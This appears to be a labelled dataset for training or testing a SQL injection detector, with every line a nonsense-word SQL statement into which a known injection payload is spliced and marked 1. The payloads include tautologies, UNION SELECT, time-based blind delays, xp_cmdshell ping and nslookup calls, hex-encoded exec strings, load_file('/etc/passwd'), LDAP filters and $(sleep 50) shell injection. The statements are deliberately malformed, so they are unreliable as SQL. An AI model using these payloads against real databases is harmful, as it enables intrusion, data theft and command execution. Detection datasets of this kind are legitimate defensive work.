+ALTER TABLE room SET rub = 0 WHERE bedroom =  or 1=1 or ""= 1 
+ALTER TABLE floor SET trip = ' or 0=0 -- WHERE disease = replace 1 
+INSERT INTO kitty (price, brain) VALUES ( or pg_sleep(__TIME__)--, ||UTL_HTTP.REQUEST) 1 
+INSERT INTO seashore (good-bye, sheep) VALUES (or 1=1--, ' or (EXISTS)) 1 
+ALTER TABLE drug SET addition =  or 1 --' WHERE twist = insert 1 
+DELETE FROM club WHERE caption = 'hi' or 'x'='x'; 1 
+SELECT pancake FROM birthday WHERE surprise = ;waitfor delay '0:0:__TIME__'-- 1 
+SELECT opinion FROM partner WHERE kiss = admin' or ' 1 
+ALTER TABLE street SET war = 23 OR 1=1 WHERE snake = 21 % 1 
+ALTER TABLE letters SET stone =  UNION ALL SELECT WHERE soda = ) or (a=a 1 
+ALTER TABLE committee SET wealth = exec sp WHERE level = " or benchmark(10000000,MD5(1))# 1 
+INSERT INTO rabbit (size, volleyball) VALUES (truncate, x' AND email IS NULL; --) 1 
+INSERT INTO kick (bells, stick) VALUES ( or 1=1 or ''=', or a = a) 1 
+DELETE FROM discovery WHERE tiger = limit 1 
+INSERT INTO wheel (rule, degree) VALUES (||'6, (||6)) 1 
+DELETE FROM pet WHERE coil =  and 1 in (select var from temp)-- 1 
+DELETE FROM distance WHERE ants = );waitfor delay '0:0:__TIME__'-- 1 
+DELETE FROM engine WHERE acoustics = | 1 
+ALTER TABLE mine SET son =  or 2 > 1 WHERE person = ' or 1=1 1 
+ALTER TABLE planes SET kittens =  or 'something' = 'some'+'thing' WHERE fifth = declare @s varchar (8000) select @s = 0x73656c ... 1 
+SELECT flight FROM fork WHERE loaf = declare @s varchar (200) select @s = 0x73656c6 ... 1 
+DELETE FROM yarn WHERE shape = ' or userid like '% 1 
+SELECT night FROM desk WHERE clam =  or 'x'='x 1 
+ALTER TABLE quilt SET property = replace WHERE argument = anything' OR 'x'='x 1 
+DELETE FROM morning WHERE insurance = "a"" or 3=3--" 1 
+DELETE FROM toad WHERE reading = hi or a=a 1 
+INSERT INTO attention (direction, table) VALUES (|,  UNION SELECT) 1 
+DELETE FROM eggs WHERE planes = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) 1 
+DELETE FROM books WHERE size = tz_offset 1 
+DELETE FROM division WHERE team = a' or 3=3-- 1 
+DELETE FROM position WHERE things = declare @q nvarchar (4000) select @q = 1 
+SELECT act FROM opinion WHERE religion =  or ''=' 1 
+ALTER TABLE twist SET cars = '; exec master..xp_cmdshell 'ping 172.10.1.255'-- WHERE insect =  or (EXISTS) 1 
+SELECT underwear FROM lake WHERE duck =  or sleep(__TIME__)=' 1 
+ALTER TABLE decision SET cars = having WHERE glass = ' UNION SELECT 1 
+ALTER TABLE relation SET songs = desc WHERE manager = ) or sleep(__TIME__)=' 1 
+INSERT INTO agreement (amount, skirt) VALUES (declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q), t'exec master..xp_cmdshell 'nslookup www.google.com'--) 1 
+ALTER TABLE weather SET weight = ")) or benchmark(10000000,MD5(1))# WHERE rest = ' or 1=1 1 
+ALTER TABLE beetle SET error = to_timestamp_tz WHERE creature = having 1 
+INSERT INTO eggs (roof, process) VALUES (*(|(objectclass=*)), x' AND 1=(SELECT COUNT(*) FROM tabname); --) 1 
+DELETE FROM boot WHERE finger = char@39A+@SELECT 1 
+ALTER TABLE match SET cherries = a' or 3=3-- WHERE way = " or "a"="a 1 
+INSERT INTO clocks (wilderness, drain) VALUES (declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),  having 1=1--) 1 
+INSERT INTO current (planes, tooth) VALUES ( or 3=3, ' or 1=1) 1 
+SELECT jump FROM cemetery WHERE suit = '||UTL_HTTP.REQUEST 1 
+ALTER TABLE grandfather SET weight = declare @q nvarchar (200) select @q = 0x770061 ... WHERE circle = 0 or 1=1 1 
+INSERT INTO frame (death, thread) VALUES (x' or 1=1 or 'x'='y, 29 %) 1 
+SELECT sidewalk FROM structure WHERE committee = uni/**/on sel/**/ect 1 
+SELECT twist FROM knot WHERE attention = ;waitfor delay '0:0:__TIME__'-- 1 
+ALTER TABLE clocks SET slip = // WHERE party = ||'6 1 
+INSERT INTO plantation (boot, cherry) VALUES (replace,  or 1=1) 1 
+DELETE FROM brothers WHERE love = select 1 
+DELETE FROM beds WHERE learning = 1) or sleep(__TIME__)# 1 
+SELECT way FROM kiss WHERE mother = (||6) 1 
+INSERT INTO guide (snail, nerve) VALUES (x' AND userid IS NULL; --,  or 3=3) 1 
+DELETE FROM bells WHERE process = hi') or ('a'='a 1 
+ALTER TABLE talk SET prose =  or '1'='1 WHERE attack =  having 1=1-- 1 
+ALTER TABLE face SET family = replace WHERE front = 1 or sleep(__TIME__)# 1 
+SELECT nation FROM robin WHERE wrench = ) or (a=a 1 
+INSERT INTO doll (rose, hair) VALUES (handler,  or 'unusual' = 'unusual') 1 
+ALTER TABLE hand SET woman = ' or (EXISTS) WHERE pickle = " or 0=0 -- 1 
+INSERT INTO sock (ray, hose) VALUES (' or 0=0 #,  or 2 between 1 and 3) 1 
+SELECT lunchroom FROM beetle WHERE ants = or 1=1-- 1 
+INSERT INTO fuel (owl, territory) VALUES ( 'sleep 50',  or benchmark(10000000,MD5(1))#) 1 
+INSERT INTO birth (spy, eggnog) VALUES (' or '1'='1'--, <>"'%;)(&+) 1 
+DELETE FROM nail WHERE ray = 29 % 1 
+INSERT INTO month (wrench, toe) VALUES (' or 0=0 #, 0 or 1=1) 1 
+ALTER TABLE balloon SET sheet =  or 2 between 1 and 3 WHERE minute = ; or '1'='1' 1 
+ALTER TABLE books SET ring =  or 0=0 -- WHERE selection =  or (EXISTS) 1 
+ALTER TABLE zebra SET point =  union select * from users where login = char ... WHERE vest = ) 1 
+ALTER TABLE manager SET clock =  -- WHERE account =  or 1=1 -- 1 
+DELETE FROM skirt WHERE writer = ") or sleep(__TIME__)=" 1 
+INSERT INTO experience (increase, bomb) VALUES (' or 1 --', PRINT @@variable) 1 
+ALTER TABLE oil SET drawer = ( WHERE flag = hi') or ('a'='a 1 
+SELECT punishment FROM competition WHERE cough = 26 % 1 
+SELECT secretary FROM mom WHERE destruction =  having 1=1-- 1 
+ALTER TABLE stranger SET dad = " or benchmark(10000000,MD5(1))# WHERE mass = a' 1 
+ALTER TABLE swim SET trick =  and 1=( if((load_file(char(110,46,101,120,11 ... WHERE airplane = a' or 1=1-- 1 
+ALTER TABLE crime SET women = ' or 3=3 WHERE passenger = ' UNION ALL SELECT 1 
+INSERT INTO dog (front, observation) VALUES (), ") or sleep(__TIME__)=") 1 
+INSERT INTO lunch (poison, cough) VALUES ( or 0=0 #",  or 1 in (select @@version)--) 1 
+ALTER TABLE friction SET time =  or a=a-- WHERE event = x' AND members.email IS NULL; -- 1 
+ALTER TABLE quill SET class = *(|(objectclass=*)) WHERE base = or 1=1-- 1 
+SELECT journey FROM guitar WHERE leg = â or 3=3 -- 1 
+SELECT building FROM fifth WHERE harmony = or 1=1 -- 1 
+SELECT iron FROM person WHERE crime =  union select 1 
+DELETE FROM fact WHERE flower = ) or sleep(__TIME__)=' 1 
+DELETE FROM lake WHERE hook = ; begin declare @var varchar(8000) set @var=' ... 1 
+INSERT INTO chairs (flavor, print) VALUES (0x77616974666F722064656C61792027303A303A313027 ..., +sqlvuln) 1 
+SELECT lettuce FROM wrist WHERE mice = ') or ('x'='x 1 
+SELECT shade FROM death WHERE addition = a' or 3=3-- 1 
+INSERT INTO thought (year, copper) VALUES (; begin declare @var varchar(8000) set @var=' ..., hi' or 1=1 --) 1 
+INSERT INTO low (kick, flight) VALUES (desc,  or 'a'='a) 1 
+SELECT calendar FROM feet WHERE ducks = or 1 
+DELETE FROM sack WHERE week = exec xp 1 
+SELECT beam FROM sock WHERE joke =  or '1'='1 1 
+DELETE FROM snow WHERE organization = 0x730065006c0065006300740020004000400076006500 ... 1 
+SELECT play FROM rifle WHERE fowl = x' AND email IS NULL; -- 1 
+SELECT industry FROM slip WHERE bed = PRINT 1 
+ALTER TABLE cake SET answer =  or a=a-- WHERE books = x' AND email IS NULL; -- 1 
+INSERT INTO point (button, range) VALUES ( $(sleep 50), 23 OR 1=1) 1 
+INSERT INTO burst (throat, river) VALUES ('sqlattempt1, exec sp) 1 
+SELECT wound FROM chance WHERE position = ' or ''=' 1 
+INSERT INTO finger (angle, children) VALUES (' or uid like '%, ' or ''=') 1 
+ALTER TABLE teeth SET range =  UNION ALL SELECT WHERE soup =  or username like char(37); 1 
+ALTER TABLE wind SET room = " or isNULL(1/0) /* WHERE ear = hi' or 1=1 -- 1 
+DELETE FROM rock WHERE farm = 1)) or pg_sleep(__TIME__)-- 1 
+ALTER TABLE tongue SET blood = ' or 1 --' WHERE bee = *| 1 
+ALTER TABLE underwear SET surprise = 1)) or benchmark(10000000,MD5(1))# WHERE measure =  or 3=3 -- 1 
+INSERT INTO team (pear, joke) VALUES (PRINT, ||6) 1 
+SELECT cakes FROM celery WHERE food =  or 1=1 /* 1 
+INSERT INTO waste (flame, metal) VALUES (@variable, 23 OR 1=1) 1 
+INSERT INTO doll (calculator, back) VALUES ( union select 1,load_file('/etc/passwd'),1,1,1;, *(|(mail=*))) 1 
+INSERT INTO rain (stage, tendency) VALUES (select, (sqlattempt2)) 1 
+ALTER TABLE table SET girl =  union select * from users where login = char ... WHERE breakfast = distinct 1 
+ALTER TABLE parcel SET grass = 1 or sleep(__TIME__)# WHERE face = " or pg_sleep(__TIME__)-- 1 
+SELECT account FROM bucket WHERE hall =  or 'text' = n'text' 1 
+INSERT INTO brick (bike, breath) VALUES (distinct,  or username like char(37);) 1 
+INSERT INTO roll (quilt, fuel) VALUES (password:*/=1--,  or 3=3) 1 
+SELECT bear FROM hope WHERE art =  or '1'='1 1 
+SELECT magic FROM cork WHERE owl = /**/or/**/1/**/=/**/1 1 
+INSERT INTO tooth (stone, cream) VALUES (" or pg_sleep(__TIME__)--, 1) or sleep(__TIME__)#) 1 
+INSERT INTO thunder (gold, loaf) VALUES ( $(sleep 50), 1 or benchmark(10000000,MD5(1))#) 1 
+ALTER TABLE basin SET argument = (sqlattempt2) WHERE river = exec xp 1 
+SELECT battle FROM lace WHERE reaction =  or 'something' = 'some'+'thing' 1 
+INSERT INTO garden (wheel, head) VALUES () or ('x'='x, )) 1 
+SELECT breath FROM crown WHERE verse = sqlvuln; 1 
+ALTER TABLE toothpaste SET string = hi' or 1=1 -- WHERE bear = 0 or 1=1 1 
+INSERT INTO table (song, nail) VALUES (hi' or 'a'='a, )) or sleep(__TIME__)=') 1 
+ALTER TABLE nail SET knee = as WHERE sack =  union select 1 
+DELETE FROM thunder WHERE songs = ; execute immediate 'sel' || 'ect us' || 'er' 1 
+ALTER TABLE alley SET window = 1) or benchmark(10000000,MD5(1))# WHERE mint = 1 or 1=1 1 
+SELECT touch FROM street WHERE cork = 0 or 1=1 1 
+ALTER TABLE vein SET cap = ));waitfor delay '0:0:__TIME__'-- WHERE truck = ; exec master..xp_cmdshell 'ping 172.10.1.255'-- 1 
+INSERT INTO mother (stew, growth) VALUES (*|, PRINT @@variable) 1 
+SELECT vein FROM fish WHERE weather = & 1 
+SELECT plate FROM planes WHERE ant = (||6) 1 
+ALTER TABLE class SET price =  -- &password= WHERE feast = // 1 
+DELETE FROM nose WHERE frogs = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+DELETE FROM pump WHERE calendar = '; exec xp_regread 1 
+ALTER TABLE sign SET curtain = ' or 1=1 or ''=' WHERE flower = )) or sleep(__TIME__)=' 1 
+SELECT cart FROM scarecrow WHERE range = ") or benchmark(10000000,MD5(1))# 1 
+INSERT INTO teeth (swing, desire) VALUES (x' AND members.email IS NULL; --, ") or pg_sleep(__TIME__)--) 1 
+INSERT INTO kick (battle, tub) VALUES ( or 1=1, x' or 1=1 or 'x'='y) 1 
+INSERT INTO opinion (trousers, pin) VALUES ( (select top 1, 1;SELECT *) 1 
+ALTER TABLE turkey SET advice = ? WHERE zinc =  or '1'='1'-- 1 
+INSERT INTO mouth (feather, square) VALUES ( or 1=1--, 29 %) 1 
+INSERT INTO bun (wire, apparatus) VALUES (exec sp, 1) or benchmark(10000000,MD5(1))#) 1 
+DELETE FROM girl WHERE story = â or 3=3 -- 1 
+DELETE FROM crayon WHERE comb = ' or 1=1 1 
+DELETE FROM doll WHERE approval = (sqlvuln) 1 
+ALTER TABLE comb SET wealth =  or 0=0 #" WHERE pan = 1 or benchmark(10000000,MD5(1))# 1 
+SELECT scarecrow FROM slave WHERE clocks = ' or 1=1 or ''=' 1 
+ALTER TABLE lettuce SET attraction = '; exec master..xp_cmdshell 'ping 172.10.1.255'-- WHERE scarecrow = ' or '1'='1'-- 1 
+SELECT use FROM circle WHERE family =  or 'whatever' in ('whatever') 1 
+DELETE FROM top WHERE desire = *(|(objectclass=*)) 1 
+ALTER TABLE page SET sound = '; exec xp_regread WHERE hospital =  UNION ALL SELECT 1 
+SELECT polish FROM blow WHERE ticket = "a"" or 1=1--" 1 
+SELECT soup FROM hate WHERE mitten = "));waitfor delay '0:0:__TIME__'-- 1 
+INSERT INTO stem (books, geese) VALUES (1 or pg_sleep(__TIME__)--,  or 1/*) 1 
+SELECT owner FROM society WHERE sock = 0x770061006900740066006F0072002000640065006C00 ... 1 
+ALTER TABLE end SET rose = or isNULL(1/0) /* WHERE apparel =  or pg_sleep(__TIME__)-- 1 
+SELECT limit FROM balls WHERE steam = a' waitfor delay '0:0:10'-- 1 
+DELETE FROM cellar WHERE summer =  union select 1 
+ALTER TABLE experience SET driving = limit WHERE land =  or 1/* 1 
+ALTER TABLE beggar SET toothbrush =  or 'whatever' in ('whatever') WHERE meat = 1 waitfor delay '0:0:10'-- 1 
+DELETE FROM popcorn WHERE girl = 1 waitfor delay '0:0:10'-- 1 
+INSERT INTO loss (burn, suggestion) VALUES (having, " or 0=0 --) 1 
+DELETE FROM patch WHERE copper = hi or a=a 1 
+INSERT INTO clock (shame, unit) VALUES ('||UTL_HTTP.REQUEST, ) union select * from information_schema.tables;) 1 
+DELETE FROM year WHERE sweater = ' UNION ALL SELECT 1 
+INSERT INTO error (fang, eggs) VALUES ((, 1) or sleep(__TIME__)#) 1 
+DELETE FROM silk WHERE condition = //* 1 
+DELETE FROM milk WHERE iron =  or 'x'='x 1 
+INSERT INTO lamp (stew, surprise) VALUES (&apos; OR, ' or 0=0 --) 1 
+SELECT dock FROM morning WHERE money = ") or benchmark(10000000,MD5(1))# 1 
+DELETE FROM hydrant WHERE sheet = " or pg_sleep(__TIME__)-- 1 
+INSERT INTO purpose (knife, point) VALUES (" or 1=1--, 3.10E+17) 1 
+INSERT INTO verse (blow, cannon) VALUES (select, "a"" or 1=1--") 1 
+ALTER TABLE ornament SET clouds = ||UTL_HTTP.REQUEST WHERE dock = uni/**/on sel/**/ect 1 
+INSERT INTO seat (governor, advertisement) VALUES (t'exec master..xp_cmdshell 'nslookup www.google.com'--,  or 1 in (select @@version)--) 1 
+SELECT fan FROM party WHERE toes =  or benchmark(10000000,MD5(1))# 1 
+INSERT INTO writer (alarm, effect) VALUES (' or 1=1, ?) 1 
+ALTER TABLE experience SET parcel = +sqlvuln WHERE edge = insert 1 
+ALTER TABLE support SET egg = " or isNULL(1/0) /* WHERE pizzas = 1 or 1=1 1 
+SELECT process FROM noise WHERE flock =  or 0=0 -- 1 
+DELETE FROM smash WHERE land = \x27UNION SELECT 1 
+ALTER TABLE cattle SET lip =  $(sleep 50) WHERE orange = @var select @var as var into temp end -- 1 
+INSERT INTO volleyball (locket, thrill) VALUES (--sp_password, 0x77616974666F722064656C61792027303A303A313027 ...) 1 
+INSERT INTO kettle (cup, mice) VALUES (*(|(mail=*)),  UNION ALL SELECT) 1 
+DELETE FROM quarter WHERE dirt = ; execute immediate 'sel' || 'ect us' || 'er' 1 
+DELETE FROM thunder WHERE shame = 28 % 1 
+INSERT INTO arch (farm, pencil) VALUES ( or a=a--, password:*/=1--) 1 
+INSERT INTO size (stove, card) VALUES (or isNULL(1/0) /*, ) or sleep(__TIME__)=') 1 
+ALTER TABLE cork SET cord = ' or ''=' WHERE suggestion = declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q) 1 
+SELECT bath FROM start WHERE hearing = 1) or sleep(__TIME__)# 1 
+ALTER TABLE mouth SET pocket = as WHERE tongue = ' or userid like '% 1 
+DELETE FROM family WHERE mouth = "a"" or 3=3--" 1 
+DELETE FROM top WHERE cause = ' or userid like '% 1 
+DELETE FROM popcorn WHERE feet = ' or 1=1 1 
+INSERT INTO cattle (school, drain) VALUES (1) or benchmark(10000000,MD5(1))#,  or 2 between 1 and 3) 1 
+INSERT INTO impulse (shop, cry) VALUES (x' AND userid IS NULL; --, ' or 0=0 --) 1 
+DELETE FROM structure WHERE chicken = *| 1 
+ALTER TABLE woman SET toy = 'hi' or 'x'='x'; WHERE basketball = @variable 1 
+ALTER TABLE need SET title =  union select WHERE nation = â or 1=1 -- 1 
+INSERT INTO giraffe (ocean, range) VALUES (" or sleep(__TIME__)#, ' UNION ALL SELECT) 1 
+ALTER TABLE border SET winter = declare @q nvarchar (200) 0x730065006c00650063 ... WHERE dinner = sqlvuln; 1 
+SELECT girl FROM game WHERE birds =  or pg_sleep(__TIME__)-- 1 
+INSERT INTO cars (trade, chess) VALUES (x' OR full_name LIKE '%Bob%, ")) or sleep(__TIME__)=") 1 
+INSERT INTO knowledge (attention, sign) VALUES (# from wapiti,  or 'text' = n'text') 1 
+ALTER TABLE goldfish SET territory =  or '1'='1'-- WHERE visitor =  -- &password= 1 
+ALTER TABLE belief SET bike =  or '1'='1 WHERE meal = " or "a"="a 1 
+ALTER TABLE sock SET attraction = or isNULL(1/0) /* WHERE game = ' or userid like '% 1 
+SELECT party FROM mine WHERE cloth = order by 1 
+DELETE FROM father WHERE beast = hi' or 1=1 -- 1 
+DELETE FROM protest WHERE flock = declare @q nvarchar (4000) select @q = 1 
+ALTER TABLE produce SET harmony = exec(@s) WHERE laborer = ")) or pg_sleep(__TIME__)-- 1 
+DELETE FROM ants WHERE hen = desc 1 
+ALTER TABLE creator SET stone =  or 0=0 -- WHERE lead = " or benchmark(10000000,MD5(1))# 1 
+INSERT INTO water (quilt, toothpaste) VALUES (; or '1'='1', '; exec master..xp_cmdshell 'ping 172.10.1.255'--) 1 
+SELECT tendency FROM pets WHERE ring = (sqlvuln) 1 
+INSERT INTO giants (man, ghost) VALUES (||'6,  or a=a--) 1 
+ALTER TABLE goat SET needle =  or 'text' > 't' WHERE vegetable = a' 1 
+INSERT INTO edge (jump, memory) VALUES (||6,  or 1=1 or ""=) 1 
+DELETE FROM vegetable WHERE voice =  $(sleep 50) 1 
+ALTER TABLE chalk SET company = ' or 'x'='x WHERE insect = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) 1 
+SELECT mother FROM competition WHERE summer = ' or 1=1 or ''=' 1 
+INSERT INTO berry (family, letter) VALUES (as,  or '1'='1'--) 1 
+ALTER TABLE loss SET loss = ") or sleep(__TIME__)=" WHERE hospital = '; exec master..xp_cmdshell 1 
+SELECT chalk FROM skate WHERE tooth = admin' or ' 1 
+INSERT INTO zebra (range, swim) VALUES (a' or 3=3--, '; exec xp_regread) 1 
+DELETE FROM jeans WHERE pail = //* 1 
+ALTER TABLE cattle SET joke = );waitfor delay '0:0:__TIME__'-- WHERE society =  or 3=3 1 
+ALTER TABLE earth SET bat = " or benchmark(10000000,MD5(1))# WHERE brush = ; or '1'='1' 1 
+DELETE FROM theory WHERE slip = admin' or ' 1 
+ALTER TABLE ornament SET brain = //* WHERE fowl = ) or pg_sleep(__TIME__)-- 1 
+DELETE FROM father WHERE yam = a' 1 
+INSERT INTO thought (value, produce) VALUES (1)) or sleep(__TIME__)#, 0x770061006900740066006F0072002000640065006C00 ...) 1 
+INSERT INTO car (cart, route) VALUES (\x27UNION SELECT, &apos; OR) 1 
+SELECT hospital FROM dirt WHERE farm = ') or ('a'='a 1 
+ALTER TABLE design SET record = <>"'%;)(&+ WHERE flavor = '; exec xp_regread 1 
+SELECT crack FROM leg WHERE church =  or 'something' = 'some'+'thing' 1 
+DELETE FROM decision WHERE vase =  or sleep(__TIME__)# 1 
+ALTER TABLE basin SET move =  or (EXISTS) WHERE nail = ') or ('a'='a 1 
+ALTER TABLE curve SET fly = 26 % WHERE food = "a"" or 1=1--" 1 
+SELECT slip FROM beetle WHERE root =  or 'unusual' = 'unusual' 1 
+DELETE FROM letter WHERE trail =  or pg_sleep(__TIME__)-- 1 
+SELECT sisters FROM song WHERE stop = ) 1 
+SELECT approval FROM respect WHERE work = ) 1 
+SELECT ant FROM society WHERE guitar =  or 2 > 1 1 
+INSERT INTO ink (cellar, hearing) VALUES (1)) or pg_sleep(__TIME__)--, /) 1 
+INSERT INTO eggnog (scent, attack) VALUES (sqlvuln,  or 0=0 #") 1 
+DELETE FROM school WHERE chain =  -- 1 
+SELECT parent FROM dust WHERE hook = ; exec master..xp_cmdshell 1 
+ALTER TABLE blow SET crook = & WHERE fish = sqlvuln; 1 
+DELETE FROM fan WHERE quiet = //* 1 
+ALTER TABLE birds SET exchange = @variable WHERE kettle = pg_sleep(__TIME__)-- 1 
+ALTER TABLE toothpaste SET map = 1) or benchmark(10000000,MD5(1))# WHERE downtown =  'sleep 50' 1 
+DELETE FROM brothers WHERE thing = ' or uname like '% 1 
+ALTER TABLE join SET flowers = ' or a=a-- WHERE goose = ') or ('a'='a 1 
+ALTER TABLE person SET oatmeal = declare @s varchar(200) select @s = 0x77616974 ... WHERE cherries =  or 1=1 -- 1 
+ALTER TABLE cord SET river =  or 1 --' WHERE potato = ||'6 1 
+DELETE FROM growth WHERE feet = ' or user like '% 1 
+INSERT INTO income (hospital, pump) VALUES (0x770061006900740066006F0072002000640065006C00 ..., exec sp) 1 
+SELECT stream FROM screw WHERE trousers = or 1=1 -- 1 
+ALTER TABLE ocean SET opinion =  union select * from users where login = char ... WHERE police = ' or 1=1 1 
+DELETE FROM change WHERE badge = '; exec master..xp_cmdshell 'ping 172.10.1.255'-- 1 
+DELETE FROM dress WHERE paint = t'exec master..xp_cmdshell 'nslookup www.google.com'-- 1 
+SELECT trains FROM soup WHERE cheese = ||'6 1 
+DELETE FROM son WHERE value = x' or 1=1 or 'x'='y 1 
+DELETE FROM grandfather WHERE price =  or 1=1 or ''=' 1 
+SELECT level FROM maid WHERE health =  or sleep(__TIME__)=' 1 
+SELECT poison FROM effect WHERE rose = 1;SELECT * 1 
+INSERT INTO slave (tub, meal) VALUES (a' or 3=3--, or a = a) 1 
+INSERT INTO moon (cream, root) VALUES (||'6, )) or benchmark(10000000,MD5(1))#) 1 
+ALTER TABLE cannon SET destruction = ' or user like '% WHERE trees = or 1=1-- 1 
+DELETE FROM trip WHERE language = sqlvuln; 1 
+ALTER TABLE quicksand SET brother = or 1=1 -- WHERE cap = 0 1 
+INSERT INTO rice (fold, shelf) VALUES ()) or pg_sleep(__TIME__)--, 29 %) 1 
+SELECT truck FROM playground WHERE cover =  or 1/* 1 
+SELECT garden FROM pipe WHERE sponge = like 1 
+SELECT bee FROM lamp WHERE cry =  union all select @@version-- 1 
+DELETE FROM cracker WHERE engine = ")) or benchmark(10000000,MD5(1))# 1 
+SELECT apple FROM low WHERE faucet = order by 1 
+INSERT INTO secretary (heart, cork) VALUES ( -- &password=,  (select top 1) 1 
+SELECT giants FROM bite WHERE help =  having 1=1-- 1 
+SELECT waves FROM bit WHERE measure = <>"'%;)(&+ 1 
+SELECT sheep FROM respect WHERE list =  or pg_sleep(__TIME__)-- 1 
+INSERT INTO street (request, hill) VALUES (1) or benchmark(10000000,MD5(1))#, 1 waitfor delay '0:0:10'--) 1 
+DELETE FROM run WHERE watch = " or 0=0 -- 1 
+ALTER TABLE weight SET prison = (||6) WHERE bottle =  or ''=' 1 
+DELETE FROM downtown WHERE attack = *(|(objectclass=*)) 1 
+DELETE FROM flame WHERE quiet = ") or sleep(__TIME__)=" 1 
+DELETE FROM harmony WHERE discussion = ; or '1'='1' 1 
+INSERT INTO measure (able, thought) VALUES (' or userid like '%, or 1=1) 1 
+SELECT trail FROM bite WHERE room = ' or userid like '% 1 
+DELETE FROM grape WHERE brush = x' AND members.email IS NULL; -- 1 
+SELECT art FROM fowl WHERE number = ) 1 
+DELETE FROM porter WHERE beam = ; exec master..xp_cmdshell 'ping 172.10.1.255'-- 1 
+DELETE FROM watch WHERE railway =  UNION ALL SELECT 1 
+INSERT INTO badge (faucet, territory) VALUES ( or 'text' > 't',  or 2 between 1 and 3) 1 
+ALTER TABLE rabbit SET believe = ' or ''=' WHERE profit = *(|(objectclass=*)) 1 
+DELETE FROM harbor WHERE low = @var select @var as var into temp end -- 1 
+SELECT pig FROM cakes WHERE men = ' or userid like '% 1 
+SELECT truck FROM zinc WHERE jar = ( 1 
+SELECT self FROM throne WHERE badge = ' or 1=1 1 
+SELECT substance FROM actor WHERE ball = ) or ('a'='a 1 
+SELECT button FROM road WHERE creator = select 1 
+SELECT anger FROM battle WHERE apple = \x27UNION SELECT 1 
+SELECT hands FROM baseball WHERE farmer =  or 1 --' 1 
+INSERT INTO monkey (science, form) VALUES (or isNULL(1/0) /*, 29 %) 1 
+INSERT INTO dinner (cry, believe) VALUES (1) or pg_sleep(__TIME__)--, 28 %) 1 
+INSERT INTO zoo (stop, legs) VALUES (&, "a"" or 1=1--") 1 
+ALTER TABLE boat SET rings = ")) or benchmark(10000000,MD5(1))# WHERE flowers = ) or benchmark(10000000,MD5(1))# 1 
+SELECT record FROM reaction WHERE wire = ' or 1=1 1 
+INSERT INTO touch (morning, growth) VALUES ((sqlattempt2),  union all select @@version--) 1 
+SELECT side FROM coal WHERE sisters =  -- 1 
+SELECT thing FROM thumb WHERE dinner =  union select 1,load_file('/etc/passwd'),1,1,1; 1 
+SELECT pot FROM sidewalk WHERE planes = t'exec master..xp_cmdshell 'nslookup www.googl ... 1 
+SELECT hydrant FROM dog WHERE birth =  UNION ALL SELECT 1 
+DELETE FROM amount WHERE club = â or 3=3 -- 1 
+INSERT INTO porter (throne, apparel) VALUES (declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q), x' OR full_name LIKE '%Bob%) 1 
+INSERT INTO uncle (development, news) VALUES (1;(load_file(char(47,101,116,99,47,112,97,115, ..., procedure) 1 
+SELECT grandfather FROM hand WHERE dinosaurs = 3.10E+17 1 
+SELECT chess FROM wrist WHERE orange = or isNULL(1/0) /* 1 
+ALTER TABLE letter SET berry = ' or 1=1 WHERE liquid = ) or benchmark(10000000,MD5(1))# 1 
+SELECT drink FROM tooth WHERE sponge = ' (select top 1 1 
+INSERT INTO vegetable (soap, lead) VALUES (or 1=1 or ""=, ' or 0=0 #) 1 
+ALTER TABLE giraffe SET sun = declare @q nvarchar (200) select @q = 0x770061 ... WHERE year = | 1 
+ALTER TABLE advertisement SET team = ||(elt(-3+5,bin(15),ord(10),hex(char(45)))) WHERE believe = '; exec master..xp_cmdshell 1 
+SELECT dime FROM smoke WHERE move =  or 0=0 -- 1 
+SELECT reason FROM turkey WHERE jellyfish = 'hi' or 'x'='x'; 1 
+DELETE FROM bikes WHERE soup =  or a=a-- 1 
+ALTER TABLE sock SET good-bye = Ã½ or 1=1 -- WHERE range = distinct 1 
+SELECT goldfish FROM bridge WHERE pipe = 3.10E+17 1 
+ALTER TABLE ear SET nest = declare @s varchar(22) select @s = WHERE doll = 0x77616974666F722064656C61792027303A303A313027 ... 1 
+INSERT INTO ocean (geese, oven) VALUES (1 or sleep(__TIME__)#, declare @s varchar (8000) select @s = 0x73656c ...) 1 
+INSERT INTO impulse (smell, potato) VALUES ()) or benchmark(10000000,MD5(1))#, *(|(mail=*))) 1 
+SELECT plough FROM rabbit WHERE potato = ' or ''=' 1 
+ALTER TABLE wind SET substance = ' or 0=0 -- WHERE territory = hi or 1=1 --" 1 
+INSERT INTO pets (bells, snow) VALUES ( or 1=1 or ""=,  --) 1 
+INSERT INTO cream (sister, hook) VALUES (a' or 3=3--, uni/**/on sel/**/ect) 1 
+INSERT INTO watch (throne, steam) VALUES (admin' or ', "a"" or 3=3--") 1 
+INSERT INTO boat (boot, magic) VALUES (0x77616974666F722064656C61792027303A303A313027 ...,  or ''=') 1 
+SELECT page FROM structure WHERE system = â or 1=1 -- 1 
+INSERT INTO worm (show, pan) VALUES (1 or 1=1, â or 3=3 --) 1 
+DELETE FROM stranger WHERE sleet = or 1=1 -- 1 
+INSERT INTO boats (butter, fork) VALUES (&, asc) 1 
+INSERT INTO fact (waste, sense) VALUES (||(elt(-3+5,bin(15),ord(10),hex(char(45)))), or 1=1) 1 
+SELECT position FROM quince WHERE meal = desc 1 
+INSERT INTO animal (edge, walk) VALUES (; execute immediate 'sel' || 'ect us' || 'er', pg_sleep(__TIME__)--) 1 
+SELECT guide FROM farmer WHERE memory =  or 0=0 #" 1 
+INSERT INTO bun (juice, eggs) VALUES ( UNION SELECT, &apos; OR) 1 
+INSERT INTO oven (glass, wrench) VALUES (1 or pg_sleep(__TIME__)--, ) or (a=a) 1 
+INSERT INTO hair (title, dime) VALUES (' or username like '%, /**/or/**/1/**/=/**/1) 1 
+INSERT INTO talk (fear, shelf) VALUES ());waitfor delay '0:0:__TIME__'--, x' AND userid IS NULL; --) 1 
+ALTER TABLE meeting SET building = )) or benchmark(10000000,MD5(1))# WHERE amusement = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+INSERT INTO stranger (downtown, badge) VALUES (or 1=1 --, hi' or 'a'='a) 1 
